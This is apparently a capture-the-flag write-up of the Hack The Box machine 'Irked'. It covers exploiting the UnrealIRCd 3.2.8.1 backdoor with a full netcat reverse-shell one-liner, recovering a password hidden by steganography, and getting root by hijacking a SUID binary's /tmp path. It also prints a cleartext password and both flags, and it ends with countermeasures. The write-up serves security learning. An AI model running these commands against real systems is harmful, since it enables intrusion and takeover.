@@ -1,0 +1,285 @@
+# Irked
+
+![](./images/irked.png)
+
+#### Machine Release Date: November 17, 2018
+
+## Summary
+
+Irked was an easy machine that required manually troubleshooting an exploit to abuse a backdoor trojan.
+After abusing the backdoor trojan, I was able to own the `djmardov` user by getting a hint that he was using steganography to hide his password somewhere.
+I was able to recover `djmardov`'s SSH password by downloading the only JPG image from the web server using the secret text from `/home/djmardov/Documents/.backup`.
+I was also able to own the `root` user by abusing a custom SUID binary installed on the system.
+
+## Skills Learned
+
+* Exploit code troubleshooting
+* Avoiding rabbit holes while enumerating privilege escalation
+* Basic steganography
+
+## Active Ports
+
+```bash
+sudo nmap -p22,80,111,6697,8067,48756,65534 -sC -sV -oA nmap/full-tcp-version 10.10.10.117
+```
+
+```none
+Nmap scan report for 10.10.10.117
+Host is up (0.045s latency).
+
+PORT      STATE SERVICE VERSION
+22/tcp    open  ssh     OpenSSH 6.7p1 Debian 5+deb8u4 (protocol 2.0)
+| ssh-hostkey: 
+|   1024 6a:5d:f5:bd:cf:83:78:b6:75:31:9b:dc:79:c5:fd:ad (DSA)
+|   2048 75:2e:66:bf:b9:3c:cc:f7:7e:84:8a:8b:f0:81:02:33 (RSA)
+|   256 c8:a3:a2:5e:34:9a:c4:9b:90:53:f7:50:bf:ea:25:3b (ECDSA)
+|_  256 8d:1b:43:c7:d0:1a:4c:05:cf:82:ed:c1:01:63:a2:0c (ED25519)
+80/tcp    open  http    Apache httpd 2.4.10 ((Debian))
+|_http-server-header: Apache/2.4.10 (Debian)
+|_http-title: Site doesn't have a title (text/html).
+111/tcp   open  rpcbind 2-4 (RPC #100000)
+| rpcinfo: 
+|   program version    port/proto  service
+|   100000  2,3,4        111/tcp   rpcbind
+|   100000  2,3,4        111/udp   rpcbind
+|   100000  3,4          111/tcp6  rpcbind
+|   100000  3,4          111/udp6  rpcbind
+|   100024  1          35674/tcp6  status
+|   100024  1          41642/udp6  status
+|   100024  1          48756/tcp   status
+|_  100024  1          58754/udp   status
+6697/tcp  open  irc     UnrealIRCd
+8067/tcp  open  irc     UnrealIRCd
+48756/tcp open  status  1 (RPC #100024)
+65534/tcp open  irc     UnrealIRCd
+Service Info: Host: irked.htb; OS: Linux; CPE: cpe:/o:linux:linux_kernel
+
+Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+# Nmap done at Mon Sep 21 16:31:42 2020 -- 1 IP address (1 host up) scanned in 73.26 seconds
+```
+
+## Failed Recon
+
+* Enumerating the web server for sensitive information.
+
+## Foothold (CVE-2010-2075)
+
+Connecting to port 6697 allowed me to fingerprint the IRC server's version number. I used this [article as a reference](https://book.hacktricks.xyz/pentesting/pentesting-irc):
+
+```none
+kali@kali:~/htb/machines/irked/irc$ ncat 10.10.10.117 6697
+:irked.htb NOTICE AUTH :*** Looking up your hostname...
+
+w:irked.htb NOTICE AUTH :*** Couldn't resolve your hostname; using your IP address instead
+USER
+:irked.htb 461  USER :Not enough parameters
+
+USER ran213eqdw123 0 * ran213eqdw123
+NICK ran213eqdw123
+:irked.htb 001 ran213eqdw123 :Welcome to the ROXnet IRC Network ran213eqdw123!ran213eqdw@10.10.14.18
+:irked.htb 002 ran213eqdw123 :Your host is irked.htb, running version Unreal3.2.8.1
+:irked.htb 003 ran213eqdw123 :This server was created Mon May 14 2018 at 13:12:50 EDT
+:irked.htb 004 ran213eqdw123 irked.htb Unreal3.2.8.1 iowghraAsORTVSxNCWqBzvdHtGp lvhopsmntikrRcaqOALQbSeIKVfMCuzNTGj
+:irked.htb 005 ran213eqdw123 UHNAMES NAMESX SAFELIST HCN MAXCHANNELS=10 CHANLIMIT=#:10 MAXLIST=b:60,e:60,I:60 NICKLEN=30 CHANNELLEN=32 TOPICLEN=307 KICKLEN=307 AWAYLEN=307 MAXTARGETS=20 :are supported by this server
+:irked.htb 005 ran213eqdw123 WALLCHOPS WATCH=128 WATCHOPTS=A SILENCE=15 MODES=12 CHANTYPES=# PREFIX=(qaohv)~&@%+ CHANMODES=beI,kfL,lj,psmntirRcOAQKVCuzNSMTG NETWORK=ROXnet CASEMAPPING=ascii EXTBAN=~,cqnr ELIST=MNUCT STATUSMSG=~&@%+ :are supported by this server
+:irked.htb 005 ran213eqdw123 EXCEPTS INVEX CMDS=KNOCK,MAP,DCCALLOW,USERIP :are supported by this server
+:irked.htb 251 ran213eqdw123 :There are 1 users and 0 invisible on 1 servers
+:irked.htb 255 ran213eqdw123 :I have 1 clients and 0 servers
+:irked.htb 265 ran213eqdw123 :Current Local Users: 1  Max: 1
+:irked.htb 266 ran213eqdw123 :Current Global Users: 1  Max: 1
+:irked.htb 422 ran213eqdw123 :MOTD File is missing
+:ran213eqdw123 MODE ran213eqdw123 :+iwx
+```
+
+From the output above, I deduced that the service version was `Unreal3.2.8.1` which had exploits publicly available:
+
+```none
+$ searchsploit unreal
+... CONTENT SNIPPED ...
+UnrealIRCd 3.2.8.1 - Backdoor Command Execution (Metasploit)                                                                                              | linux/remote/16922.rb
+UnrealIRCd 3.2.8.1 - Local Configuration Stack Overflow                                                                                                   | windows/dos/18011.txt
+UnrealIRCd 3.2.8.1 - Remote Downloader/Execute                                                                                                            | linux/remote/13853.pl
+UnrealIRCd 3.x - Remote Denial of Service                                                                                                                 | windows/dos/27407.pl
+... CONTENT SNIPPED ...
+```
+
+The `UnrealIRCd 3.2.8.1 - Remote Downloader/Execute` exploit didn't work too well, so I exploited it manually since it looks like you need to send the payload shortly after establishing the TCP connection. Basically, you can abuse the backdoor trojan via command injection on the `AB` macro. I was able to invoke a reverse netcat shell this way:
+
+```none
+kali@kali:~/htb/machines/irked/irc/exploit$ ncat 10.10.10.117 6697
+:irked.htb NOTICE AUTH :*** Looking up your hostname...
+AB; rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.10.14.18 2001 >/tmp/f
+```
+
+On my Kali machine:
+
+```none
+$ ncat -nvlp 2001
+Ncat: Version 7.80 ( https://nmap.org/ncat )
+Ncat: Listening on :::2001
+Ncat: Listening on 0.0.0.0:2001
+Ncat: Connection from 10.10.10.117.
+Ncat: Connection from 10.10.10.117:41836.
+/bin/sh: 0: can't access tty; job control turned off
+$ id
+uid=1001(ircd) gid=1001(ircd) groups=1001(ircd)
+```
+
+After getting a netcat reverse shell, I immediately [upgraded to a PTY](https://medium.com/bugbountywriteup/pimp-my-shell-5-ways-to-upgrade-a-netcat-shell-ecd551a180d2).
+
+## Privilege Escalation - User Own (World Readable Password Hint)
+
+After listing the content of the `/home` directory, I noticed the `djmardov` user. I enumerated their directory for sensitive information:
+
+```none
+ircd@irked:/home/djmardov$ find . -ls 2>/dev/null
+1061877    4 drwxr-xr-x  18 djmardov djmardov     4096 Nov  3  2018 .
+1177472    4 drwx------   3 djmardov djmardov     4096 May 11  2018 ./.dbus
+1061885    4 -rw-r--r--   1 djmardov djmardov      675 May 11  2018 ./.profile
+1062684    0 lrwxrwxrwx   1 root     root            9 Nov  3  2018 ./.bash_history -> /dev/null
+1177702    4 drwx------   2 djmardov djmardov     4096 May 11  2018 ./.ssh
+1061894    4 drwxr-xr-x   2 djmardov djmardov     4096 May 14  2018 ./Downloads
+1177456    4 drwxr-xr-x   2 djmardov djmardov     4096 May 15  2018 ./Documents
+1177813    4 -rw-------   1 djmardov djmardov       33 May 15  2018 ./Documents/user.txt
+1177807    4 -rw-r--r--   1 djmardov djmardov       52 May 16  2018 ./Documents/.backup
+1177703    4 drwx------   2 djmardov djmardov     4096 May 15  2018 ./.gnupg
+1061893    4 drwxr-xr-x   2 djmardov djmardov     4096 May 11  2018 ./Desktop
+1177523    4 drwx------  13 djmardov djmardov     4096 May 15  2018 ./.cache
+1177487    4 drwx------   3 djmardov djmardov     4096 Nov  3  2018 ./.gconf
+1177477    4 drwx------   3 djmardov djmardov     4096 May 11  2018 ./.local
+1061897    8 -rw-------   1 djmardov djmardov     4706 Nov  3  2018 ./.ICEauthority
+1177457    4 drwxr-xr-x   2 djmardov djmardov     4096 May 11  2018 ./Music
+1177455    4 drwxr-xr-x   2 djmardov djmardov     4096 May 11  2018 ./Public
+1177467    4 drwx------  15 djmardov djmardov     4096 May 15  2018 ./.config
+1061886    4 -rw-r--r--   1 djmardov djmardov      220 May 11  2018 ./.bash_logout
+1061887    4 -rw-r--r--   1 djmardov djmardov     3515 May 11  2018 ./.bashrc
+1177466    4 drwxr-xr-x   2 djmardov djmardov     4096 May 11  2018 ./Videos
+1177458    4 drwxr-xr-x   2 djmardov djmardov     4096 May 11  2018 ./Pictures
+1061895    4 drwxr-xr-x   2 djmardov djmardov     4096 May 11  2018 ./Templates
+1177582    4 drwx------   4 djmardov djmardov     4096 May 11  2018 ./.mozilla
+```
+
+The `/home/djmardov/Documents/.backup` file revealed the following information:
+
+```none
+iircd@irked:/home/djmardov$ cat ./Documents/.backup
+Super elite steg backup pw
+UPupDOWNdownLRlrBAbaSSss
+```
+
+This user hinted that he used staganography somewhere, likely to hide their password.
+From the failed web enumeration from earlier, the web page hosted a single image file at `/var/www/html/irked.jpg`:
+
+```none
+ircd@irked:/home/djmardov$ find /var/www -ls
+263054    4 drwxr-xr-x   3 root     root         4096 May 14  2018 /var/www
+263055    4 drwxr-xr-x   2 root     root         4096 May 15  2018 /var/www/html
+261259    4 -rw-r--r--   1 root     root           72 May 14  2018 /var/www/html/index.html
+261204   36 -rw-r--r--   1 root     root        34697 May 14  2018 /var/www/html/irked.jpg
+271923   12 -rw-r--r--   1 root     root        10701 May 11  2018 /var/www/index.old
+```
+
+After downloading the image from the web server, I was able to run `stegbrute` with the password `UPupDOWNdownLRlrBAbaSSss` I previously found in `/home/djmardov/Documents/.backup`:
+
+![](./images/irked-steg.jpg)
+
+```none
+kali@kali:~/htb/machines/irked/privesc/steg$ steghide --extract -sf irked.jpg -p UPupDOWNdownLRlrBAbaSSss
+wrote extracted data to "pass.txt".
+kali@kali:~/htb/machines/irked/privesc/steg$ cat pass.txt
+Kab6h+m+bbp2J:HG
+```
+
+I was then able to use that password to become the `djmardov` user:
+
+```none
+ircd@irked:/home/djmardov$ su djmardov
+Password:
+djmardov@irked:~$ id
+uid=1000(djmardov) gid=1000(djmardov) groups=1000(djmardov),24(cdrom),25(floppy),29(audio),30(dip),44(video),46(plugdev),108(netdev),110(lpadmin),113(scanner),117(bluetooth)
+djmardov@irked:~$ cat user.txt
+```
+
+And grab thier flag:
+
+```none
+djmardov@irked:~$ cat Documents/user.txt
+4a66a78b12dc0e661a59d3f5c0267a8e
+```
+
+## Privilege Escalation - Root Own (Abusing Arbitrary Commands Invoked by SUID Binaries)
+
+From the previos `id` command above, I noticed the `djmardov` user was part of the `video` group which meant that this user was allowed perform video related operations.
+Enumerating the system for SUID binaries reveled the following:
+
+```none
+djmardov@irked:/dev/shm$ find / -perm -4000 -ls 2>/dev/null
+404330  356 -rwsr-xr--   1 root     messagebus   362672 Nov 21  2016 /usr/lib/dbus-1.0/dbus-daemon-launch-helper
+394848   12 -rwsr-xr-x   1 root     root         9468 Mar 28  2017 /usr/lib/eject/dmcrypt-get-device
+412270   16 -rwsr-xr-x   1 root     root        13816 Sep  8  2016 /usr/lib/policykit-1/polkit-agent-helper-1
+410047  552 -rwsr-xr-x   1 root     root       562536 Nov 19  2017 /usr/lib/openssh/ssh-keysign
+408970   16 -rwsr-xr-x   1 root     root        13564 Oct 14  2014 /usr/lib/spice-gtk/spice-client-glib-usb-acl-helper
+409724 1060 -rwsr-xr-x   1 root     root      1085300 Feb 10  2018 /usr/sbin/exim4
+424276  332 -rwsr-xr--   1 root     dip        338948 Apr 14  2015 /usr/sbin/pppd
+394369   44 -rwsr-xr-x   1 root     root        43576 May 17  2017 /usr/bin/chsh
+410065   96 -rwsr-sr-x   1 root     mail        96192 Nov 18  2017 /usr/bin/procmail
+394371   80 -rwsr-xr-x   1 root     root        78072 May 17  2017 /usr/bin/gpasswd
+393000   40 -rwsr-xr-x   1 root     root        38740 May 17  2017 /usr/bin/newgrp
+409644   52 -rwsr-sr-x   1 daemon   daemon      50644 Sep 30  2014 /usr/bin/at
+412272   20 -rwsr-xr-x   1 root     root        18072 Sep  8  2016 /usr/bin/pkexec
+424835   12 -rwsr-sr-x   1 root     root         9468 Apr  1  2014 /usr/bin/X
+394373   52 -rwsr-xr-x   1 root     root        53112 May 17  2017 /usr/bin/passwd
+394368   52 -rwsr-xr-x   1 root     root        52344 May 17  2017 /usr/bin/chfn
+1062682    8 -rwsr-xr-x   1 root     root         7328 May 16  2018 /usr/bin/viewuser
+914060   96 -rwsr-xr-x   1 root     root        96760 Aug 13  2014 /sbin/mount.nfs
+783487   40 -rwsr-xr-x   1 root     root        38868 May 17  2017 /bin/su
+783401   36 -rwsr-xr-x   1 root     root        34684 Mar 29  2015 /bin/mount
+792821   36 -rwsr-xr-x   1 root     root        34208 Jan 21  2016 /bin/fusermount
+792836  160 -rwsr-xr-x   1 root     root       161584 Jan 28  2017 /bin/ntfs-3g
+783402   28 -rwsr-xr-x   1 root     root        26344 Mar 29  2015 /bin/umount
+```
+
+Notably, the `/usr/bin/viewuser` stands out as a custom application. I figured I might be able to abuse this binary since it will run with root privileges:
+
+```none
+djmardov@irked:/dev/shm$ /usr/bin/viewuser -h
+This application is being devleoped to set and test user permissions
+It is still being actively developed
+(unknown) :0           2020-09-21 16:29 (:0)
+ircd     pts/1        2020-09-21 20:03 (10.10.14.18)
+sh: 1: /tmp/listusers: not found
+```
+
+The error `sh: 1: /tmp/listusers: not found` is super suspicious because it looked like a failed shell invocation.
+Since the `/tmp/` directory is world-writable, I wrote a shell script so that the script would invoke a shell with root privileges:
+
+```none
+djmardov@irked:/dev/shm$ echo '#!/bin/sh' > /tmp/listusers
+djmardov@irked:/dev/shm$ echo '/bin/bash' >> /tmp/listusers
+djmardov@irked:/dev/shm$ chmod +x /tmp/listusers
+djmardov@irked:/dev/shm$ /usr/bin/viewuser
+This application is being devleoped to set and test user permissions
+It is still being actively developed
+(unknown) :0           2020-09-21 16:29 (:0)
+ircd     pts/1        2020-09-21 20:03 (10.10.14.18)
+root@irked:/dev/shm# id
+uid=0(root) gid=1000(djmardov) groups=1000(djmardov),24(cdrom),25(floppy),29(audio),30(dip),44(video),46(plugdev),108(netdev),110(lpadmin),113(scanner),117(bluetooth)
+```
+
+From here, I was able to compromise the system and grab the root flag:
+
+```none
+root@irked:/dev/shm# cat /root/root.txt
+8d8e9e8be64654b6dccc3bff4522daf3
+```
+
+### Failed Privilege Escalation Enumeration
+
+* Failed Dirty COW exploit
+* Failed CUPS exploits
+
+## Countermeasures
+
+* Upgrade to the latest version of Unreal IRCd. Carefully watch the changelogs to ensure no backdoor trojans are introduced and always download Unreal IRCd binaries from trusted sources.
+* Don't give other users on the system hints on where to find your passwords.
+* Restrict SUID binaries to be executable as root only by a particular group of users.
